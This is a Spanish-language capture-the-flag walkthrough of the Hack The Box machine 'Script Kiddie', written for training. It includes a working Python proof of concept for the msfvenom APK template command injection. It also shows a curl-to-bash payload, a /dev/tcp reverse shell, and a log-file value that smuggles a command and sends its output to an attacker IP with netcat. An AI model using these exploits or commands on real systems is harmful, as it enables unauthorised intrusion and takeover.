---
title: "Script Kiddie - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ScriptKiddie/data/Scriptkiddie.png"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Bash
  - Sudo
  - Linux
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ScriptKiddie/data/HTBscriptkiddie.png">
</p>

La máquina **Script Kiddie** es una máquina virtual vulnerable de la plataforma **HackTheBox** con un nivel de dificultad **fácil** una calificación en el rank de 4.1, **5039 USER OWNS** y **4475 SYSTEM OWNS** con la ip **10.10.10.226** y un sistema operativo **Linux**.


# Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.226]** utilizando los parámetros:
 - **-p-:**    Escaneo a toda la gama de puertos (65536).
 - **-n:**     No hacen la resolución del DNS.
 - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
 - **-v:**     Aumenta el nivel de los mensajes verbose.
 - **--open:** Muestra sólo los puertos con un estatus abierto.
 - **-oG:**    Guarda la el output en formato Grepeable.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/scanPort.png?raw=true">
</p>

Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,5000**:

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/Ports.png?raw=true">
</p>

Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

 - -sC: Script de enumeración básica de sondeo en puertos y servicios alojados.
 - -sV: Detección de versiones en servicios alojados en puertos.
 - -p : Puertos a inspeccionar.
 - -oN: Formatos de Nmap en los que se guardará el archivo.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/PortServ.png?raw=true">
</p>

Gracias a lo que nos mostró el escaneo de servicios y versiones se puede ver que en el puerto **5000** se aloja un servicio **http** y en el puerto **22** un servicio **ssh**, sabiendo esto y yendo a un navegador e ingresando al servicio **http** por el puerto **5000** se puede ver la siguiente web.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/scan/web.png?raw=true">
</p>

Es una web que cuenta con diferentes herramientas implementada en la web de pentesting como **nmap**, **msfvenom** y **searchsploit**.
Algo que se alcanza a ver es que en la herramienta implementada de **msfvenom** se pueden subir **template**, investigando se puede llegar a un articulo el cual explica una vulnerabilidad existente en una version [desactualizada del framework de metasploit](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/).

En ella se habla de como crear un **apk** malicioso con el cual a la hora de implementarlo como **template** en la creación de un archivo apk el **apk tmplate** injecta comandos en la maquina.

En el articulo habla de como hacerlo con la herramienta de **metasploit** pero no es necesario ya que podemos hacer uso del siguiente código en python que saque de el [github de justinsteven ](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md).
```python
#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

# Change me
payload = '[Insert Payload]'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
```
En este código solo tenemos que cambiar el **payload** para el **apk maliciosos** que generaremos, en este caso yo me enviare 5 paquetes icmp y para verificar si tengo ejecución de comando examinare los paquetes con **tcpdum**.


Así que voy a la web y cargo el apk malicioso que generé con el script en python.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/exp1.png?raw=true">
</p>

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/exp2.png?raw=true">
</p>

Excelente si tenemos ejecución de comandos en la maquina victima así que modificare el payload para entablar me una shell a mi maquina.

Como yo tuve fallas para entablar me la shell lo que hice fue crear un archivó con codigo en bash en mi maquina y levantar un servicio **http** con python y en el payload del script ingresar: **```payload = 'curl http://[Your IP]/bash.sh | bash'```**.


Esto es así ya que cuando la maquina victima haga el curl y vea el contenido del archivo al pipearlo con bash interpretara el código que en este caso es una conexión por bash a mi maquiná y así otorgándome la shell.

```bash
#!/bin/bash

bash -i >& /dev/tcp/[Your Ip]/[PORT] 0>&1
```


<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/shell.png?raw=true">
</p>


# Privilege escalation


Ahora que ya tenemos el acceso a la maquina se puede ver que accedemos como el usuario **kid** y enumerando el sistema se ve que existen 3 usuario:
* root
* kid
* pwd

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/passwd.png?raw=true">
</p>

En el dirección personal de **kid** hay una carpeta **logs/** con un archivo llamado **hackers** el cual no tiene contenido.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/kid.png?raw=true">
</p>

Si enumeramos mas el sistem podemos acceder al directorio personalde **pwd** en el cual hay un archivo .sh que tiene el siguiente contenido

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Lo que hace este código es verificar si el archivo **"hackers"** tiene contenido y si lo tiene lo filtra a partir del tercer argumento del contendió que tenga y luego este contenido que se supone que debe ser una ip lo manda como argumento a comando de namp para hacer el escaneo.


Algo que podemos hacer es imprimir contenido en el archivo **hackers** y poner en blanco 3 espacios para evitar asi el filtro y concatenado un **';'** esto es así ya que estamos indicando que después de hacer el cat ejecuta la siguiente orden que le pasaremos la cual sera un comando a nuestro beneficio junto a un **'#'** para que no entre en conflicto ningún argumento del script y todo este output ingresarlo en **hackers**.

En este caso para verificar que funcionara probe haciendo un **"whoami"** y enviar el output por **'netcat'** a mi maquina

```bash
echo '    ; whoami | nc 10.10.15.125 444 #' > hackers
```

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/whoami.png?raw=true">
</p>

Excelente ya que se comprueba que podemos injectar comando como **pwd** entonces me entablare una conexión a mi maquina y por ende me dará la shell como el usuario  **pwd**

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/shell2.png?raw=true">
</p>

Muy bien ahora que somos **pwd** buscaremos la forma de escalar privilegios a **root**, enumerando el sistema podemos ver que el usuario **pwd** tiene permisos sudo para ejecutar sin contraseña el framework **/opt/metasploit-framework-6.0.9/msfconsole**.

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/sudo.png?raw=true">
</p>

Sabiendo esto una vez que estamos dentro de mestasploit podemos ejecutar comandos como si estuviéramos en una shell y si lo hacemos bajo el privilegios sudo estaríamos ejecutando comando como root e incluso otorgarnos una shell como el mismo.

```bash
sudo -u root /opt/metasploit-framework-6.0.9/msfconsole
```

<p align="center">
<img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/HTB/ScriptKiddie/intrusion/root.png?raw=true">
</p>

Con esto se podría concluir la maquina **ScriptKiddie** así sacando el máximo privilegios que es **root**.

Muchas Gracias por leer <3.
